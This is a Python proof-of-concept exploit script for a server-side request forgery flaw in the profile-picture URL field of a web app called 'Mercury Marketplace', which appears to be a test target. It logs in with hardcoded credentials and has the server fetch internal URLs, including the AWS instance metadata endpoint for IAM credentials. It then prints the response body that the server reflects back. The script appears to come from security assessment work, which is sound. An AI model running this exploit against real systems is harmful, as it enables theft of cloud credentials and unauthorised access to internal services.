#!/usr/bin/env python3
"""
VULN-003 — SSRF via Profile Picture URL (Mercury Marketplace)
Endpoint: PUT /api/users/me
Field   : profile_picture_url
Auth    : Any authenticated user

The server fetches the supplied URL server-side to verify it points to an image.
No scheme or host restrictions are applied. When the fetched response is not
an image content-type, the first 300 bytes of the response body are reflected
back in the error — giving full read access to internal services.

Targets
-------
  http://169.254.169.254/latest/meta-data/        AWS IMDSv1 metadata
  http://169.254.169.254/latest/meta-data/iam/... AWS IAM credentials
  http://127.0.0.1:8005/api/products/search?q=headphones  Internal product search (no auth)
  http://127.0.0.1:<port>/                         Any internal port

Usage
-----
    python poc_003_ssrf_profile_picture.py
    python poc_003_ssrf_profile_picture.py --url http://localhost:8000 --target http://169.254.169.254/latest/meta-data/
    python poc_003_ssrf_profile_picture.py --target http://127.0.0.1:8005/api/products/search?q=headphones
"""

import argparse
import sys
import requests

USER_EMAIL    = "charlie@mercury.com"
USER_PASSWORD = "Buyer123!"


def banner():
    print("=" * 60)
    print("  VULN-003 — SSRF via Profile Picture URL")
    print("  Endpoint: PUT /api/users/me  (profile_picture_url)")
    print("=" * 60)


def login(base_url: str) -> str:
    resp = requests.post(
        f"{base_url}/api/auth/login",
        json={"email": USER_EMAIL, "password": USER_PASSWORD},
        timeout=10,
    )
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print("[-] Login failed")
        sys.exit(1)
    print(f"[+] Authenticated as {USER_EMAIL}")
    return token


def trigger_ssrf(base_url: str, token: str, target_url: str) -> str:
    print(f"[*] Sending SSRF payload: {target_url}")
    resp = requests.put(
        f"{base_url}/api/users/me",
        headers={"Authorization": f"Bearer {token}"},
        json={"profile_picture_url": target_url},
        timeout=15,
    )

    data = resp.json()

    # If content-type is not image/*, the server reflects the fetched body in the error detail
    if resp.status_code == 400:
        detail = data.get("detail", "")
        # Extract the reflected response body from the error message
        marker = "):"
        idx = detail.find(marker)
        if idx != -1:
            return detail[idx + len(marker):].strip()
        return detail

    # If the URL happened to return image/* content-type, URL is stored (blind SSRF confirmed)
    print("[*] Server accepted the URL (content-type was image/*) — blind SSRF confirmed")
    return "(URL stored — response not reflected, but server-side request was made)"


def main():
    parser = argparse.ArgumentParser(description="PoC — VULN-003 SSRF via Profile Picture URL")
    parser.add_argument("--url", default="http://localhost:8000", help="Base URL of the target")
    parser.add_argument(
        "--target",
        default="http://127.0.0.1:8005/api/products/search?q=headphones",
        help="Internal URL to fetch via SSRF",
    )
    args = parser.parse_args()

    banner()
    print(f"[*] Target app : {args.url}")
    print(f"[*] SSRF target: {args.target}")
    print()

    token  = login(args.url)
    output = trigger_ssrf(args.url, token, args.target)

    print()
    print("[+] ---- Reflected Response from Internal URL ------------------")
    print(output)
    print("----------------------------------------------------------------")
    print()
    print("[+] Done.")


if __name__ == "__main__":
    main()
